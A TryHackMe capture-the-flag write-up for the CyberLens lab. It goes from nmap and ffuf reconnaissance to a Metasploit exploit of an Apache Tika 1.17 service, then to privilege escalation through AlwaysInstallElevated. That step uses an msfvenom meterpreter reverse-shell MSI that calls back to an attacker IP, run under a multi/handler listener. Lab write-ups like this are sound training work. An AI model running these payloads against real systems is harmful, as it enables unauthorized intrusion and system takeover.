# TryHackMe CyberLens Writeup

---

## **`Nmap`** Scan

```ruby
nmap -sCV -Pn 10.112.129.165
```

```ruby
Nmap scan report for 10.112.129.165
Host is up (0.13s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
|_http-title: CyberLens: Unveiling the Hidden Matrix
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.57 (Win64)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-13T06:55:57+00:00
| ssl-cert: Subject: commonName=CyberLens
| Not valid before: 2026-03-12T06:54:40
|_Not valid after:  2026-09-11T06:54:40
|_ssl-date: 2026-03-13T06:56:05+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-13T06:55:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.97 seconds

```

| Port |  service         |
| ---- | ---------------- |
| 80   | Web exploitation |
| 445  | SMB enumeration  |
| 3389 | RDP access       |
| 5985 | WinRM shell      |

---
---

```ruby
sudo echo '10.112.129.165 cyberlens.thm' >> /etc/hosts
```

<img width="1887" height="713" alt="image" src="https://github.com/user-attachments/assets/1caa5a9f-350b-4e5c-af25-3e5111120b7b" />

---

## ffuf to find endpoints

```
ffuf -u http://10.112.129.165/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

<img width="996" height="565" alt="image" src="https://github.com/user-attachments/assets/7ba4aa1c-e7cd-41b0-af92-124d3f5d8789" />

---

### found in source code 

```js

    document.addEventListener("DOMContentLoaded", function() {
      document.getElementById("metadataButton").addEventListener("click", function() {
        var fileInput = document.getElementById("imageFileInput");
        var file = fileInput.files[0];
  
        var reader = new FileReader();
        reader.onload = function() {
          var fileData = reader.result;
  
          fetch("http://cyberlens.thm:61777/meta", {
            method: "PUT",
            body: fileData,
            headers: {
              "Accept": "application/json",
              "Content-Type": "application/octet-stream"
            }
          })
          .then(response => {
            if (response.ok) {
              return response.json();
            } else {
              throw new Error("Error: " + response.status);
            }
          })
          .then(data => {
            var metadataOutput = document.getElementById("metadataOutput");
            metadataOutput.innerText = JSON.stringify(data, null, 2);
          })
          .catch(error => {
            console.error("Error:", error);
          });
        };
  
        reader.readAsArrayBuffer(file);
      });
    });

```

## look when we upload photo it sent to **`http://cyberlens.thm:61777/meta`**

```
http://cyberlens.thm:61777/
```

<img width="1494" height="559" alt="image" src="https://github.com/user-attachments/assets/b6b722fb-043a-454b-9728-6c3c32440a33" />

```
searchsploit Apache Tika 1.17
```

<img width="1078" height="202" alt="image" src="https://github.com/user-attachments/assets/a88d5580-a130-426e-85fa-a864df1f190f" />

## now use metasploit to exploit 

<img width="1043" height="407" alt="image" src="https://github.com/user-attachments/assets/76f0e3a9-e91a-4662-80f1-b1ee72aee705" />

```
show options
set RHOSTS MACHINE_IP
set RPORT 61777
set lhost tun0
run
```

<img width="1035" height="591" alt="image" src="https://github.com/user-attachments/assets/12a99fca-c12d-4def-93e7-6b28b43b1874" />

```
getuid
cd C:\\Users\CyberLens\Desktop
cat user.txt
```

<img width="1071" height="344" alt="image" src="https://github.com/user-attachments/assets/dc2711ad-ef13-415f-9c21-94ffd1279cac" />

```
THM{T***************-w1n}
```

----

## PrivEsc

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

<img width="1077" height="294" alt="image" src="https://github.com/user-attachments/assets/4d38a838-f0bf-495b-87f6-5a86f17a2082" />

1️⃣ What is AlwaysInstallElevated?
=============================================

### In Windows there is a **Group Policy** called:

```
AlwaysInstallElevated
```

> ## If it is activated in the system, this means:

```
Any MSI file that is run will be executed with Administrator privileges
```

> ## Even if the user is **regular and not Admin**.

---

## so now let's create `MSI` file and put it on server and excute it  

**`Genrate msi file with msfvenom`**

```ruby
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.137.69 LPORT=4444 -f msi > priv.msi
```

<img width="1060" height="184" alt="image" src="https://github.com/user-attachments/assets/b31594aa-729c-4623-a172-4b80fd5d2565" />

```
upload priv.msi
```

<img width="1142" height="374" alt="image" src="https://github.com/user-attachments/assets/a535943f-29fa-4b57-b7fd-6816f2891f05" />

## run it with 

```
msiexec /quiet /qn /i priv.msi
```

<img width="905" height="99" alt="image" src="https://github.com/user-attachments/assets/8d02adc8-f066-407e-a10c-ba34c3221c0d" />

## open listener to get the shell 

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

<img width="1173" height="484" alt="image" src="https://github.com/user-attachments/assets/1e1635eb-3951-4ef5-a9a7-1a8371199b67" />

# boom we became system 

```
cd C:\\Users\Administrator\Desktop
type admin.txt
```

<img width="1118" height="330" alt="image" src="https://github.com/user-attachments/assets/35a9735e-f1fa-4698-82e5-33555b1f8934" />

```
THM{3l*************35c!}
```

